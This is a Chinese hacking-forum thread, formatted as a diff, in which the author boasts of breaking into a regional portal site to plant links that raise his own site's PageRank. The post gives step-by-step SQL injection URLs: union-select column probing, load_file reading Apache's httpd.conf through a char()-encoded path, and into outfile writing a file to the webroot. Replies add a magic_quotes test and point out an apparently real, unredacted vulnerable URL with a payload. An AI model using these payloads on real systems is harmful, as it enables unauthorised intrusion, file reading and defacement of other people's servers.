@@ -1,0 +1,73 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+入侵某地方门户加PR
+D8888D主贴内容-------------------------------------------------------
+文章作者：云中鹰
+信息来源：噩靈戰隊[Evil-Soul Security Team]（[url=http://bbs.x-xox-x.com/]链接标记http://bbs.x-xox-x.com[/url]）
+今天挺无聊的，打开QQ也不知道和谁扯淡。最近在开个动漫站，正愁没有方法提高PR，正好看到某B在XX地上线了，在网上查了下XX地的门户[url=http://www.xxxxxxx.com/]链接标记www.xxxxxxx.com[/url]，查了下价值。觉得还过的去（图1），就去鸟他了。
+
+[url=http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214527734.JPG]链接标记[img]http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214527734.JPG[/img][/url]
+
+图1
+
+个人比较喜欢日PHP，于是在GG搜索inurl:.php site:xxxxxxx.com（图2），在黑框框内发现某分站的路径，接下来就搜索了inurl:.php site:[url=http://www.xxxxxxx.com/]链接标记www.xxxxxxx.com[/url]，发现一个PHP的点，用and 1=1和and 1=2，然后用order by 6/*发现有6个表，再访问http://www.xxxxxxx.com/xxxx/comxxx.php?classid=206 and 1=2 union select 1,2,3,4,5,6/*，显示出“2”（图3）
+
+[url=http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214528621.JPG]链接标记[img]http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214528621.JPG[/img][/url]
+
+图2
+[url=http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214529371.JPG]链接标记[img]http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214529371.JPG[/img][/url]
+
+图3
+
+
+
+
+
+话说之前我们不是发现一个路径吗？现在来读下APACHE的配置文件：“/usr/local/apache2/conf/httpd.conf”，转换后放入URL里访问：[url=http://www.xxxxxxx.com/xxxx/comxxx.php?classid=206%20and%201=2%20union%20select%201,%20load_file%28char%2847,117,115,114,47,108,111,99,97,108,47,97,112,97,99,104,101,50,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102%29%29,3,4,5,6/*]链接标记http://www.xxxxxxx.com/xxxx/comxxx.php?classid=206 and 1=2 union select 1, load_file(char(47,117,115,114,47,108,111,99,97,108,47,97,112,97,99,104,101,50,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102)),3,4,5,6/*[/url]。然后搜索关键字htdocs找到目录为/www/xxxxxx.com/www/，用工具看了下，发现magic_quotes_gpc=Off。嘿嘿，这样就好了，可以用OUTFILE INTO写文件进去，提交URL为：“[url=http://www.xxxxxxx.com/xxxx/comxxx.php?classid=206/**/and/**/1=2/**/union/**/select/**/1,2,3,4,%27by%20yzy%27,6%20from%20user%20into%20outfile%20%27/www/xxxxxx.com/www/yzy.txt%27/*]链接标记http://www.xxxxxxx.com/xxxx/comxxx.php?classid=206/**/and/**/1=2/**/union/**/select/**/1,2,3,4,'by
+yzy',6%20from user into
+outfile
+'/www/xxxxxx.com/www/yzy.txt'/*[/url]”这样文件就写上去了（图4）。
+
+
+
+
+[url=http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214530112.JPG]链接标记[img]http://www.hacknote.com/uploadfile/2009-02-28/HackNote.Com214530112.JPG[/img][/url]
+
+
+
+
+
+
+图4
+
+
+
+
+接下来只要加上我站的连接就可以了，我只是为了PR，管理员叔叔不要怪我哦。Boku no iyaa,I’m coming.
+
+D8888D回贴内容-------------------------------------------------------
+日奥！靠，magic_quotes_gpc=Off，无语
+
+等着看提权呢，米有啦？？？？？？？？？？？？？？
+太那个了吧！
+
+D8888D回贴内容-------------------------------------------------------
+用啥工具看的是OFF??我用穿山甲看怎么是ON?
+
+D8888D回贴内容-------------------------------------------------------
+
+
+工具不可靠！去读取文件，进行查看，因为那里面的是真的！
+
+D8888D回贴内容-------------------------------------------------------
+判断gpc有一个很简单的方法
+and '1'='1'
+正常返回就是off，出错就是on
+
+D8888D回贴内容-------------------------------------------------------
+马赛克没打好
+
+[url=http://www.longhoo.net/voting/countnew.php?classid=214%20and%201=2%20union%20select%201]链接标记http://www.longhoo.net/voting/co ... 0union%20select%201[/url],user(),3,4,5,6/*
+
+[  ]
